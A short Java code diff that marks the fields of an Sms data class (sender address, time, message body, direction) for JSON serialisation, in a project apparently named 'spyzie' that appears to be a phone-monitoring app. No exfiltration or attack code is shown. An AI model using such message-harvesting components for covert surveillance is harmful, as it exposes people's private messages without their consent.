@@ -1,5 +1,7 @@
 package com.tantd.spyzie.data.model;
 
+import com.google.gson.annotations.Expose;
+
 import io.objectbox.annotation.Entity;
 import io.objectbox.annotation.Id;
 
@@ -8,10 +10,15 @@ public class Sms {
 
     @Id
     public long _id;
+    @Expose
     public long id;
+    @Expose
     public String address;
+    @Expose
     public long time;
+    @Expose
     public String body;
+    @Expose
     public boolean isIncoming;
 
     public Sms() {
